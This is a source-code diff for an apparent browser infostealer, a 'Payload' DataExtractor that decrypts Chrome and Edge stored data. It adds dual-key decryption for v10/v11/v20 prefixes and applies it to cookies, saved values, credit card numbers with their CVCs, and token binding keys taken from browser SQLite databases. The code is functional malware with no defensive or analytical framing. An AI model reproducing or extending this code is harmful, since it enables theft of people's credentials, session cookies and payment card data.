@@ -13,8 +13,20 @@
 
 namespace Payload {
 
-    DataExtractor::DataExtractor(PipeClient& pipe, const std::vector<uint8_t>& key, const std::filesystem::path& outputBase)
-        : m_pipe(pipe), m_key(key), m_outputBase(outputBase) {}
+    // Constructor now accepts KeyBundle
+    DataExtractor::DataExtractor(PipeClient& pipe, const KeyBundle& keys, const std::filesystem::path& outputBase)
+        : m_pipe(pipe), m_appKey(keys.appKey), m_osKey(keys.osKey), m_outputBase(outputBase) {
+        
+        if (m_appKey) {
+            m_pipe.LogDebug("DataExtractor: App key available (" + std::to_string(m_appKey->size()) + " bytes)");
+        }
+        if (m_osKey) {
+            m_pipe.LogDebug("DataExtractor: OS key available (" + std::to_string(m_osKey->size()) + " bytes)");
+        }
+        if (!m_appKey && !m_osKey) {
+            m_pipe.LogDebug("DataExtractor: WARNING - No keys available!");
+        }
+    }
 
     sqlite3* DataExtractor::OpenDatabase(const std::filesystem::path& dbPath) {
         sqlite3* db = nullptr;
@@ -73,6 +85,68 @@ namespace Payload {
                 std::filesystem::remove(tempDir);
             }
         } catch (...) {}
+    }
+
+    // Smart decryption with prefix detection (like first extractor)
+    std::optional<std::vector<uint8_t>> DataExtractor::DecryptWithPrefixDetection(const std::vector<uint8_t>& encrypted) {
+        if (encrypted.empty()) {
+            return std::nullopt;
+        }
+
+        // Check encryption prefix
+        if (encrypted.size() >= 3) {
+            // Edge v10/v11 - use osKey
+            if (memcmp(encrypted.data(), "v10", 3) == 0 || memcmp(encrypted.data(), "v11", 3) == 0) {
+                if (m_osKey) {
+                    auto decrypted = Crypto::AesGcm::Decrypt(*m_osKey, encrypted);
+                    if (decrypted) {
+                        m_pipe.LogDebug("Decrypt: v10/v11 using OS key - SUCCESS");
+                        return decrypted;
+                    }
+                }
+                m_pipe.LogDebug("Decrypt: v10/v11 but no OS key available");
+            }
+            // Chrome/Edge v20 - try appKey first, fallback to osKey
+            else if (memcmp(encrypted.data(), "v20", 3) == 0) {
+                // Try appKey first
+                if (m_appKey) {
+                    auto decrypted = Crypto::AesGcm::Decrypt(*m_appKey, encrypted);
+                    if (decrypted) {
+                        m_pipe.LogDebug("Decrypt: v20 using App key - SUCCESS");
+                        return decrypted;
+                    }
+                }
+                // Fallback to osKey
+                if (m_osKey) {
+                    auto decrypted = Crypto::AesGcm::Decrypt(*m_osKey, encrypted);
+                    if (decrypted) {
+                        m_pipe.LogDebug("Decrypt: v20 fallback to OS key - SUCCESS");
+                        return decrypted;
+                    }
+                }
+                m_pipe.LogDebug("Decrypt: v20 but no keys available");
+            }
+        }
+
+        // No prefix or unknown prefix - try both keys
+        if (m_appKey) {
+            auto decrypted = Crypto::AesGcm::Decrypt(*m_appKey, encrypted);
+            if (decrypted) {
+                m_pipe.LogDebug("Decrypt: No prefix using App key - SUCCESS");
+                return decrypted;
+            }
+        }
+        
+        if (m_osKey) {
+            auto decrypted = Crypto::AesGcm::Decrypt(*m_osKey, encrypted);
+            if (decrypted) {
+                m_pipe.LogDebug("Decrypt: No prefix using OS key - SUCCESS");
+                return decrypted;
+            }
+        }
+
+        m_pipe.LogDebug("Decrypt: All attempts failed");
+        return std::nullopt;
     }
 
     void DataExtractor::ProcessProfile(const std::filesystem::path& profilePath, const std::string& browserName) {
@@ -134,17 +208,16 @@ namespace Payload {
         DWORD encodedSize = 0;
         if (!CryptBinaryToStringA((const BYTE*)input.data(), (DWORD)input.size(), 
                                  CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &encodedSize)) {
-            return ""; // Return empty on failure
+            return "";
         }
         
         std::string encoded;
         encoded.resize(encodedSize);
         if (!CryptBinaryToStringA((const BYTE*)input.data(), (DWORD)input.size(), 
                                  CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &encoded[0], &encodedSize)) {
-            return ""; // Return empty on failure
+            return "";
         }
         
-        // Remove null terminator
         if (!encoded.empty() && encoded.back() == '\0') {
             encoded.pop_back();
         }
@@ -166,10 +239,11 @@ namespace Payload {
             
             if (blob && blobLen > 0) {
                 std::vector<uint8_t> encrypted((uint8_t*)blob, (uint8_t*)blob + blobLen);
-                auto decrypted = Crypto::AesGcm::Decrypt(m_key, encrypted);
+                auto decrypted = DecryptWithPrefixDetection(encrypted);
                 
                 if (decrypted && !decrypted->empty()) {
                     std::string val;
+                    // Remove 32-byte header if present (for cookies)
                     if (decrypted->size() > 32) {
                         val = std::string((char*)decrypted->data() + 32, decrypted->size() - 32);
                     } else {
@@ -237,7 +311,7 @@ namespace Payload {
             
             if (blob && blobLen > 0) {
                 std::vector<uint8_t> encrypted((uint8_t*)blob, (uint8_t*)blob + blobLen);
-                auto decrypted = Crypto::AesGcm::Decrypt(m_key, encrypted);
+                auto decrypted = DecryptWithPrefixDetection(encrypted);
                 
                 if (decrypted) {
                     std::string val((char*)decrypted->data(), decrypted->size());
@@ -289,7 +363,7 @@ namespace Payload {
                 int len = sqlite3_column_bytes(stmt, 1);
                 if (guid && blob && len > 0) {
                     std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
-                    auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
+                    auto dec = DecryptWithPrefixDetection(enc);
                     if (dec) cvcMap[guid] = std::string((char*)dec->data(), dec->size());
                 }
             }
@@ -307,7 +381,7 @@ namespace Payload {
             
             if (blob && len > 0) {
                 std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
-                auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
+                auto dec = DecryptWithPrefixDetection(enc);
                 if (dec) {
                     std::string num((char*)dec->data(), dec->size());
                     std::string cvc = (guid && cvcMap.count(guid)) ? cvcMap[guid] : "";
@@ -362,7 +436,7 @@ namespace Payload {
             
             if (blob && len > 0) {
                 std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
-                auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
+                auto dec = DecryptWithPrefixDetection(enc);
                 if (dec) {
                     std::string val((char*)dec->data(), dec->size());
                     
@@ -413,7 +487,7 @@ namespace Payload {
             
             if (blob && len > 0) {
                 std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
-                auto dec = Crypto::AesGcm::Decrypt(m_key, enc);
+                auto dec = DecryptWithPrefixDetection(enc);
                 if (dec) {
                     std::string val((char*)dec->data(), dec->size());
                     std::string bindingKey = "";
@@ -423,7 +497,7 @@ namespace Payload {
                         int bKeyLen = sqlite3_column_bytes(stmt, 2);
                         if (bKeyBlob && bKeyLen > 0) {
                             std::vector<uint8_t> encKey((uint8_t*)bKeyBlob, (uint8_t*)bKeyBlob + bKeyLen);
-                            auto decKey = Crypto::AesGcm::Decrypt(m_key, encKey);
+                            auto decKey = DecryptWithPrefixDetection(encKey);
                             if (decKey) {
                                 bindingKey = std::string((char*)decKey->data(), decKey->size());
                             }
